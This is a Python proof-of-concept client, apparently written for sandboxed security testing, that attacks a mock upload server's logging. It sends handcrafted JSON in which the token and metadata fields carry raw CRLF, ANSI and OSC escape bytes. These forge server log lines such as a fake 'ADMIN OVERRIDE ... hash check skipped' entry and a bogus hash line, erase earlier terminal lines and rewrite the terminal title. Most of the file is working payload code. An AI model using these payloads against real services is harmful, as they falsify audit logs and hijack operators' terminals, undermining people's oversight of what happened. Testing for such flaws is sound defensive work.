#!/usr/bin/env python3
"""Log-injection probe for the mock upload server's logging (see upload_server.py).

The server's `log()` never calls json.loads() on HELLO/METADATA payloads - it only
utf-8-decodes the raw bytes and print()s a slice - so a string field containing a raw
CR/LF or ANSI/OSC escape byte lands in the server's log verbatim. This client builds
the wire bytes directly (NOT via json.dumps(), which would escape \\r \\n \\x1b into
inert literal backslash-sequences and defeat the whole point) so genuine control bytes
reach the wire inside an otherwise well-formed-looking JSON object. Confirmed result
(see deep/swarm/adversarial-local-llm/results/log-injection-crlf-ansi/): CRLF forges
extra log lines that mimic the server's own "[port] ..." prefix format, and ANSI/OSC
sequences pass through to execute on a real terminal tailing the log. No crash/hang -
this is a log-integrity bug, not a memory-safety one.

SANDBOX ONLY - localhost mock server, synthetic data only.
"""
import argparse, socket, ssl, struct, sys, time

OK, HELLO, PROTO, SESSION, START, FILE, HASH, SAVE, COMPLETE, METADATA = 1, 2, 3, 4, 5, 6, 7, 8, 9, 12

CRLF = b"\r\n"
FORGED_PORT = b"9999"
FORGED_LINE = b"[" + FORGED_PORT + b"] <- opcode 9 (UPLOAD_COMPLETE)" + CRLF + \
              b"[" + FORGED_PORT + b"]    client ack=1  ** ADMIN OVERRIDE: upload accepted, hash check skipped **"

ANSI_HIDE = b"\x1b[2K\x1b[1A\x1b[2K\r"
ANSI_COLOR = b"\x1b[31mFAKE-ALERT\x1b[0m"
OSC_TITLE = b"\x1b]0;PWNED-BY-LOG-INJECTION\x07"


def connect(host, port, tls):
    s = socket.create_connection((host, port), timeout=10)
    if tls:
        ctx = ssl._create_unverified_context()
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def be_long(n):
    return struct.pack(">q", n)


def _recvn(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            raise ConnectionError("closed")
        b += c
    return b


def _recvn_opt(s):
    s.settimeout(0.3)
    try:
        return s.recv(1)
    except Exception:
        return b""
    finally:
        s.settimeout(10)


def hello_raw_bytes(s, payload_bytes):
    """Send a HELLO with an already-built (possibly malformed) JSON byte string."""
    s.sendall(bytes([HELLO]))
    s.sendall(bytes([3]))
    s.sendall(be_long(len(payload_bytes)))
    s.sendall(payload_bytes)
    n = struct.unpack(">q", _recvn(s, 8))[0]
    resp = _recvn(s, n)
    _recvn_opt(s)
    s.sendall(bytes([OK]))
    return resp.decode("utf-8", "replace")


def metadata_raw_bytes(s, meta_bytes):
    s.sendall(bytes([METADATA]))
    s.sendall(be_long(len(meta_bytes)))
    s.sendall(meta_bytes)
    return _recvn(s, 1)


CASES = []


def case(name):
    def deco(fn):
        CASES.append((name, fn))
        return fn
    return deco


@case("raw-crlf-forged-log-line-in-token")
def _c1(host, port, tls):
    s = connect(host, port, tls)
    payload = (b'{"authToken": "SANDBOX-TOKEN-' + FORGED_LINE +
               b'", "serial": "MOCK-000000", "clientVersion": "sandbox"}')
    resp = hello_raw_bytes(s, payload)
    s.close()
    return {"hello_resp": resp}


@case("raw-ansi-hide-previous-line-in-token")
def _c2(host, port, tls):
    s = connect(host, port, tls)
    payload = (b'{"authToken": "SANDBOX-TOKEN' + ANSI_HIDE +
               b'innocuous-looking-token-after-erase", "serial": "MOCK-000000", "clientVersion": "sandbox"}')
    resp = hello_raw_bytes(s, payload)
    s.close()
    return {"hello_resp": resp}


@case("raw-osc-terminal-title-in-token")
def _c3(host, port, tls):
    s = connect(host, port, tls)
    payload = (b'{"authToken": "SANDBOX-TOKEN-' + OSC_TITLE +
               b'", "serial": "MOCK-000000", "clientVersion": "sandbox"}')
    resp = hello_raw_bytes(s, payload)
    s.close()
    return {"hello_resp": resp}


@case("raw-crlf-forged-log-line-in-metadata")
def _c4(host, port, tls):
    s = connect(host, port, tls)
    hello_raw_bytes(s, b'{"authToken": "SANDBOX-FAKE-TOKEN", "serial": "MOCK-000000", "clientVersion": "sandbox"}')
    for op in (SESSION, START):
        s.sendall(bytes([op])); _recvn(s, 1)
    ts = str(int(time.time())).encode()
    meta = (b'{"cameraSerial": "MOCK-000000", "createdAt": ' + ts +
            b', "detections": [{"className": "vehicle' + CRLF +
            b'[' + FORGED_PORT + b']    received 999999B, sha256=deadbeef... (FORGED)' +
            b'", "confidence": 0.9, "xmin": 0.1, "ymin": 0.1, "xmax": 0.5, "ymax": 0.5}]}')
    ack = metadata_raw_bytes(s, meta)
    s.close()
    return {"metadata_ack": ack.hex()}


@case("raw-ansi-color-in-metadata")
def _c5(host, port, tls):
    s = connect(host, port, tls)
    hello_raw_bytes(s, b'{"authToken": "SANDBOX-FAKE-TOKEN", "serial": "MOCK-000000", "clientVersion": "sandbox"}')
    for op in (SESSION, START):
        s.sendall(bytes([op])); _recvn(s, 1)
    ts = str(int(time.time())).encode()
    meta = b'{"cameraSerial": "' + ANSI_COLOR + b'", "createdAt": ' + ts + b', "detections": []}'
    ack = metadata_raw_bytes(s, meta)
    s.close()
    return {"metadata_ack": ack.hex()}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--plaintext", action="store_true")
    a = ap.parse_args()
    tls = not a.plaintext

    results = []
    for name, fn in CASES:
        try:
            out = fn(a.host, a.port, tls)
            results.append({"case": name, "ok": True, **out})
            print(f"[client] {name}: OK {out}")
        except Exception as e:
            results.append({"case": name, "ok": False, "error": f"{type(e).__name__}: {e}"})
            print(f"[client] {name}: EXCEPTION {type(e).__name__}: {e}")
    import json
    print(json.dumps({"results": results}, indent=2))


if __name__ == "__main__":
    main()
